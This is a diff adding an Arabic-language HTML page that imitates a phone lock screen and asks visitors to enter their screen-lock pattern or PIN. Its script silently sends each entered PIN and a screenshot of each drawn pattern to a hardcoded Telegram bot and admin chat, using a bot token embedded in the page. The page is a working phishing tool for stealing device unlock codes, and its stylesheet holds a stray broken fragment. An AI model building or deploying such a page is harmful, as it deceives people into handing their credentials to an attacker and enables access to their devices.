@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختر طريقة الدخول</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; user-select: none; }
+        .hidden { display: none !important; }
+        .container { display: flex; flex-direction: column; align-items: center; gap: 20px; width: 320px; }
+        h1 { font-size: 28px; font-weight: 400; }
+        p { font-size: 17px; color: #e5e5ea; }
+        .status-message { margin-top: 10px; font-size: 16px; height: 22px; transition: color 0.3s; }
+        .success { color: #32d74b; }
+        .error { color: #ff453a; }
+        .back-button { position: absolute; bottom: 40px; font-size: 17px; color: #fff; background: none; border: none; cursor: pointer; opacity: 0.8; }
+        .back-button:hover { opacity: 1; }
+        .choice-button { width: 100%; padding: 15px; font-size: 18px; font-weight: 500; border: 1px solid #555; background-color: #1c1c1e; color: #fff; border-radius: 12px; cursor: pointer; transition: background-color 0.2s; }
+        .choice-button:hover { background-color: #2c2c2e; }
+        #pin-display-container { height: 70px; display: flex; align-items: center; justify-content: center; }
+        #pin-display { display: flex; gap: 20px; }
+        .pin-dot { width: 13px; height: 13px; border-radius: 50%; border: 1px solid #fff; transition: background-color 0.3s; }
+        .pin-dot.filled { background-color: #fff; }
+        #pin-keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; width: 250px; margin: 0 auto; }
+        .keypad-button { height: 75px; width: 75px; font-size: 36px; font-weight: 400; border-radius: 50%; border: none; background-color: rgba(255, 255, 255, 0.15); color: #fff; cursor: pointer; transition: background-color 0.2s; display: flex; flex-direction: column; justify-content: center; align-items: center; line-height: 1; }
+        .keypad-button:active { background-color: rgba(255, 255, 255, 0.3); }
+        .keypad-button .subtext { font-size: 10px; font-weight: 600; text-transform: uppercase; margin-top: 2px; letter-spacing: 1px; }
+        .keypad-button.functional { background: none; font-size: 17px; }
+        #send-pin-btn { color: #34c759; }
+        #delete-pin-btn { color: #ff3b30; }
+        #pattern-container { position: relative; padding: 20px; background-color: #1c1c1e; border-radius: 25px; }
+        #pattern-grid { display: grid; grid-template-columns: repeat(3, 70px); grid-template-rows: repeat(3, 70px); gap: 20px; }
+        .pattern-dot { width: 20px; height: 20px; background-color: rgba(255, 255, 255, 0.3); border-radius: 50%; margin: 25px; transition: all 0.2s; }
+        .pattern-dot.active { background-color: #0a84ff; transform: scale(1.5); box-shadow: 0 0 15px rgba(10, 132, 255, 0.7); }
+        .pattern-dot.start-dot { background-color: #ff3b30; transform: scale(1.5); box-shadow: 0 0 15px rgba(255, 59, 48, 0.7); }
+        .pattern-dot.end-dot { background-color: #32d74b; transform: scale(1.5); box-shadow: 0 0 15px rgba(50, 215, 75, 0.7); }
+        .main-header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 25px;
+            width: 100%;
+            max-width: 500px;
+            box-sizing: border-box;
+        }
+        .logo-container { flex-shrink: 0; }
+        .profile-pic {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 3px solid #FFD700;
+            object-fit: cover;
+            animation: spin 8s linear infinite;
+        }
+        .title-container {
+            margin-right: 20px;
+            overflow: hidden;
+            flex-grow: 1;
+            position: relative;
+            height: 40px;
+        }
+        .moving-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #f1f1f1;
+            white-space: nowrap;
+            position: absolute;
+            animation: move-right-to-left 10s linear infinite;
+        }
+360deg); } }
+        @keyframes move-right-to-left { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        .main-btn:hover { background: #111; color: #0f0; border: 2px solid #0f0; }
+        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        @keyframes move-right-to-left { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+        .main-btn:hover { background: #111; color: #0f0; border: 2px solid #0f0; }
+        #line-canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
+        #pattern-line { stroke: #0a84ff; stroke-width: 5; stroke-linecap: round; fill: none; filter: drop-shadow(0 0 5px rgba(10, 132, 255, 0.7)); }
+    </style>
+</head>
+<body>
+
+<div id="choice-screen" class="container">
+    <h1>اختر طريقة قفل الشاشه الخاصة بك</h1>
+
+
+      <header class="main-hesader">
+        <div class="logo-container">
+            <img src="mahmoud.png" alt="Mahmoud" class="profile-pic">
+        </div>
+      
+    </header>
+
+    <p id="welcome-message">أهلاً بك! كيف تود المتابعة؟</p>
+    <button id="choose-pattern-btn" class="choice-button">استخدام النقش</button>
+    <button id="choose-pin-btn" class="choice-button">استخدام الأرقام (PIN)</button>
+</div>
+
+<div id="pattern-screen" class="container hidden">
+    <h1>ارسم النقش</h1>
+    <div id="pattern-container">
+        <div id="pattern-grid"></div>
+        <svg id="line-canvas"><polyline id="pattern-line"></polyline></svg>
+    </div>
+    <div id="pattern-status" class="status-message"></div>
+    <button class="back-button">رجوع</button>
+</div>
+
+<div id="pin-screen" class="container hidden">
+    <h1>أدخل الرمز</h1>
+    <div id="pin-display-container"><div id="pin-display"></div></div>
+    <div id="pin-keypad"></div>
+    <div id="pin-status" class="status-message"></div>
+    <button class="back-button">رجوع</button>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const userId = urlParams.get('id');
+    const botToken = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
+    const adminChatId = '1431886140';
+    const choiceScreen = document.getElementById('choice-screen');
+    const patternScreen = document.getElementById('pattern-screen');
+    const pinScreen = document.getElementById('pin-screen');
+    const welcomeMessage = document.getElementById('welcome-message');
+    if (userId) { welcomeMessage.textContent = `أهلاً بك يا صاحب المعرف: ${userId}`; }
+
+    function showScreen(screenToShow) {
+        choiceScreen.classList.add('hidden');
+        patternScreen.classList.add('hidden');
+        pinScreen.classList.add('hidden');
+        screenToShow.classList.remove('hidden');
+    }
+    document.getElementById('choose-pattern-btn').addEventListener('click', () => showScreen(patternScreen));
+    document.getElementById('choose-pin-btn').addEventListener('click', () => showScreen(pinScreen));
+    document.querySelectorAll('.back-button').forEach(button => {
+        button.addEventListener('click', () => showScreen(choiceScreen));
+    });
+
+    const patternGrid = document.getElementById('pattern-grid');
+    const patternContainer = document.getElementById('pattern-container');
+    const patternLine = document.getElementById('pattern-line');
+    const patternStatus = document.getElementById('pattern-status');
+    let currentPattern = [];
+    let isDrawing = false;
+    const dots = [];
+    for (let i = 1; i <= 9; i++) { const dot = document.createElement('div'); dot.classList.add('pattern-dot'); dot.dataset.id = i; patternGrid.appendChild(dot); dots.push(dot); }
+    patternContainer.addEventListener('mousedown', startDrawing);
+    patternContainer.addEventListener('touchstart', startDrawing, { passive: false });
+    document.addEventListener('mouseup', stopDrawing);
+    document.addEventListener('touchend', stopDrawing);
+    document.addEventListener('mousemove', draw);
+    document.addEventListener('touchmove', draw, { passive: false });
+
+    const pinDisplay = document.getElementById('pin-display');
+    const pinKeypad = document.getElementById('pin-keypad');
+    const pinStatus = document.getElementById('pin-status');
+    let currentPin = '';
+    const keys = [ { num: '1', sub: '' }, { num: '2', sub: 'ABC' }, { num: '3', sub: 'DEF' }, { num: '4', sub: 'GHI' }, { num: '5', sub: 'JKL' }, { num: '6', sub: 'MNO' }, { num: '7', sub: 'PQRS' }, { num: '8', sub: 'TUV' }, { num: '9', sub: 'WXYZ' }, { num: 'إرسال', sub: '', id: 'send-pin-btn', functional: true }, { num: '0', sub: '+' }, { num: 'مسح', sub: '', id: 'delete-pin-btn', functional: true } ];
+    keys.forEach(keyInfo => {
+        const button = document.createElement('button');
+        button.classList.add('keypad-button');
+        const numberSpan = document.createElement('span');
+        numberSpan.textContent = keyInfo.num;
+        button.appendChild(numberSpan);
+        if (keyInfo.sub) { const subtextSpan = document.createElement('span'); subtextSpan.textContent = keyInfo.sub; subtextSpan.classList.add('subtext'); button.appendChild(subtextSpan); }
+        if (keyInfo.functional) { button.classList.add('functional'); button.id = keyInfo.id; numberSpan.style.fontSize = '17px'; }
+        button.addEventListener('click', () => handleKeyPress(keyInfo.num));
+        pinKeypad.appendChild(button);
+    });
+
+    function handleKeyPress(key) {
+        if (key === 'إرسال') { if (currentPin.length > 0) sendPin(); }
+        else if (key === 'مسح') { currentPin = currentPin.slice(0, -1); }
+        else { if (currentPin.length < 6) { currentPin += key; } }
+        updatePinDisplay();
+    }
+
+    function updatePinDisplay() {
+        pinDisplay.innerHTML = '';
+        for (let i = 0; i < 6; i++) { const dot = document.createElement('div'); dot.classList.add('pin-dot'); if (i < currentPin.length) { dot.classList.add('filled'); } pinDisplay.appendChild(dot); }
+    }
+    
+    function resetPin() { currentPin = ''; updatePinDisplay(); pinStatus.textContent = ''; }
+
+    async function captureAndSendPattern() {
+        patternStatus.textContent = 'جارٍ التقاط الرسمة وإرسالها...';
+        try {
+            const canvas = await html2canvas(patternContainer, { backgroundColor: null, useCORS: true, scale: 2 });
+            canvas.toBlob(async (blob) => {
+                const adminCaption = `🎨 تم إدخال النقش التالي:\n${currentPattern.join(' → ')}\n\n👤 من المستخدم: ${userId || 'غير معروف'}`;
+                const userCaption = `لقد قمت برسم النقش التالي:\n${currentPattern.join(' → ')}`;
+                const sendPromises = [sendPhotoToTelegram(adminChatId, blob, adminCaption)];
+                if (userId && userId !== adminChatId) { sendPromises.push(sendPhotoToTelegram(userId, blob, userCaption)); }
+                const results = await Promise.all(sendPromises);
+                if (results[0]) { patternStatus.textContent = 'تم إرسال الرسمة بنجاح!'; patternStatus.className = 'status-message success'; }
+                else { throw new Error('Failed to send to admin'); }
+                setTimeout(resetPattern, 2000);
+            }, 'image/png');
+        } catch (error) { patternStatus.textContent = 'فشل إرسال الرسمة.'; patternStatus.className = 'status-message error'; setTimeout(resetPattern, 2000); }
+    }
+
+    function startDrawing(e) { if (e.target.closest('.pattern-dot')) { e.preventDefault(); isDrawing = true; resetPattern(); draw(e); } }
+    function draw(e) { if (!isDrawing) return; e.preventDefault(); const touch = e.touches ? e.touches[0] : e; const element = document.elementFromPoint(touch.clientX, touch.clientY); const dot = element?.closest('.pattern-dot'); if (dot && !currentPattern.includes(dot.dataset.id)) { activateDot(dot); } updateLine(touch); }
+    async function stopDrawing() { if (!isDrawing) return; isDrawing = false; if (currentPattern.length > 1) { const lastDotId = currentPattern[currentPattern.length - 1]; dots[lastDotId - 1].classList.add('end-dot'); patternLine.setAttribute('points', patternLine.dataset.finalPoints); setTimeout(async () => { await captureAndSendPattern(); }, 100); } else { resetPattern(); } }
+    function activateDot(dot) { if (currentPattern.length === 0) { dot.classList.add('start-dot'); } else { dot.classList.add('active'); } currentPattern.push(dot.dataset.id); updateFinalLine(); }
+    function getRelativePos(dot) { const containerRect = patternContainer.getBoundingClientRect(); const rect = dot.getBoundingClientRect(); return { x: rect.left - containerRect.left + rect.width / 2, y: rect.top - containerRect.top + rect.height / 2 }; }
+    function updateFinalLine() { let points = ''; currentPattern.forEach(id => { const pos = getRelativePos(dots[id - 1]); points += `${pos.x},${pos.y} `; }); patternLine.dataset.finalPoints = points.trim(); patternLine.setAttribute('points', points); }
+    function updateLine(touch) { if (!isDrawing || currentPattern.length === 0) return; const containerRect = patternContainer.getBoundingClientRect(); const x = touch.clientX - containerRect.left; const y = touch.clientY - containerRect.top; patternLine.setAttribute('points', `${patternLine.dataset.finalPoints || ''} ${x},${y}`); }
+    function resetPattern() { currentPattern = []; dots.forEach(d => d.classList.remove('active', 'start-dot', 'end-dot')); patternLine.setAttribute('points', ''); patternLine.dataset.finalPoints = ''; patternStatus.textContent = ''; }
+
+    async function sendPin() {
+        pinStatus.textContent = 'جارٍ إرسال الرمز...';
+        const adminCaption = `🔢 تم إدخال الرمز التالي:\n${currentPin}\n\n👤 من المستخدم: ${userId || 'غير معروف'}`;
+        const userCaption = `لقد قمت بإدخال الرمز التالي:\n${currentPin}`;
+        const sendPromises = [sendMessageToTelegram(adminChatId, adminCaption)];
+        if (userId && userId !== adminChatId) { sendPromises.push(sendMessageToTelegram(userId, userCaption)); }
+        const results = await Promise.all(sendPromises);
+        if (results[0]) { pinStatus.textContent = 'تم إرسال الرمز بنجاح!'; pinStatus.className = 'status-message success'; }
+        else { pinStatus.textContent = 'فشل إرسال الرمز.'; pinStatus.className = 'status-message error'; }
+        setTimeout(resetPin, 2000);
+    }
+
+    async function sendPhotoToTelegram(chatId, photoBlob, caption) { const formData = new FormData(); formData.append('chat_id', chatId); formData.append('photo', photoBlob, 'pattern.png'); formData.append('caption', caption); try { const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: formData }); const result = await response.json(); if (!result.ok) console.error(`Failed to send photo to ${chatId}:`, result.description); return result.ok; } catch (error) { console.error(`Network error sending photo to ${chatId}:`, error); return false; } }
+    async function sendMessageToTelegram(chatId, text) { const url = `https://api.telegram.org/bot${botToken}/sendMessage`; const params = { chat_id: chatId, text: text }; try { const response = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(params) }); const result = await response.json(); if (!result.ok) console.error(`Failed to send message to ${chatId}:`, result.description); return result.ok; } catch (error) { console.error(`Network error sending message to ${chatId}:`, error); return false; } }
+</script>
+
+</body>
+</html>
